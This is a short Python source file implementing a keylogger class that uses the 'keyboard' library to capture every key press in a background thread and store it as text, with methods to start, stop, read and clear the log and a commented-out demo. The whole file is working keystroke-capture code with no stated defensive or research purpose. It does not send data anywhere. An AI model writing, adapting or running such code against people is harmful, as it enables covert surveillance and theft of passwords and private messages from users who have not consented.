from sys import stderr
from threading import Thread, Lock
import keyboard
import time

# Translation Table
TRANSLATION_TABLE = {
    "space":" ",
    "ctrl":"'CTRL'",
    "shift":"'SHIFT",
    "tab":"'TAB'",
    "enter":"'ENTER'",
    "backspace":"\b",
    "alt":"'ALT'"
}


class Keylogger:


    def __init__(self):
        # This stores every key press.
        self.__keylog = ""
        self.__active = False
        self.__stop = False
        self.__thread = None
        self.__lock = Lock()
    

    def __read_keystrokes(self):
        while not self.__stop:
            event = keyboard.read_event()
            if event.event_type == "down":
                try:
                    temp = TRANSLATION_TABLE[event.name]
                    self.__lock.acquire()
                    self.__keylog += temp
                    self.__lock.release()
                except KeyError:
                    self.__lock.acquire()
                    self.__keylog += event.name
                    self.__lock.release()
        self.__active = False


    def start(self) -> bool:
        if self.__active:
            return False
        self.__active = True
        self.__thread = Thread(target=self.__read_keystrokes)
        self.__thread.start()   
        return True


    def stop(self) -> bool:
        if not self.__active:
            return False
        self.__stop = True
        self.__active = False
        return True

    def get_keylog(self):
        keylog = ""
        self.__lock.acquire()
        keylog = self.__keylog
        self.__lock.release()
        return keylog
    

    def clear_keylog(self):
        self.__lock.acquire()
        self.__keylog = ""
        self.__lock.release()
    

# if __name__ == "__main__":
#     k = Keylogger()
#     k.start()
#     time.sleep(15)
#     k.stop()
#     print(f"Before: {k.get_keylog()}")
#     k.clear_keylog()
#     print(f"After: {k.get_keylog()}")
